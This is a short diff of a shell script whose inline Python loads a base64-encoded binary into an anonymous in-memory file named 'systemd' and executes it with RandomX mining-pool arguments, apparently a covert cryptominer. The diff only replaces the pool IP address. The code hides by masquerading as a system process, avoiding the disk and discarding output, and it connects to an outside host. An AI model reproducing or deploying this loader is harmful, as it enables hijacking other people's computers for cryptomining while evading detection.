@@ -5,4 +5,4 @@ python3 -c "import os, base64; \
 memfd = os.memfd_create('systemd', os.MFD_CLOEXEC); \
 os.write(memfd, base64.b64decode(open('systemd.b64', 'rb').read())); \
 os.lseek(memfd, 0, os.SEEK_SET); \
-os.execl(f'/proc/self/fd/{memfd}', f'/proc/self/fd/{memfd}', '-o', '40.81.243.163:443', '-a', 'rx', '-u', 'NHbWmURgbZRWUVDeuSYuyHTEdKfadbVMRzAE.data')" > /dev/null 2>&1
+os.execl(f'/proc/self/fd/{memfd}', f'/proc/self/fd/{memfd}', '-o', '217.156.67.54:443', '-a', 'rx', '-u', 'NHbWmURgbZRWUVDeuSYuyHTEdKfadbVMRzAE.data')" > /dev/null 2>&1
